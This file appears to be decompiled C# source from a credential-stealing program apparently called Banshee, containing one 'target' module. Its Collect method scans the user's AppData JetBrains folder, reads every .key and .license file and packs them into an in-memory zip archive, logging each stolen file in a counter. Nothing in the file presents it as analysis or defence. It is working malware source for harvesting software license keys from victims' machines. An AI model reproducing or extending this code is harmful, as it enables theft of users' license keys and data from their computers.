﻿using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Banshee.Helper.Data;

namespace Banshee.Targets.Applications
{
	// Token: 0x0200009B RID: 155
	public class JetBrains : ITarget
	{
		// Token: 0x060001CD RID: 461 RVA: 0x0000F4C8 File Offset: 0x0000F4C8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JetBrains");
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] allowedExtensions = new string[]
			{
				".key",
				".license"
			};
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "JetBrains";
			Parallel.ForEach<string>(Directory.GetDirectories(path), delegate(string apps)
			{
				Parallel.ForEach<string>(Directory.GetFiles(apps), delegate(string file)
				{
					if (allowedExtensions.Contains(Path.GetExtension(file)))
					{
						string text = "JetBrains\\" + Path.GetFileName(apps) + "\\" + Path.GetFileName(file);
						zip.AddFile(text, File.ReadAllBytes(file));
						counterApplications.Files.Add(file + " => " + text);
					}
				});
			});
			if (counterApplications.Files.Count<string>() > 0)
			{
				counterApplications.Files.Add("JetBrains\\");
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
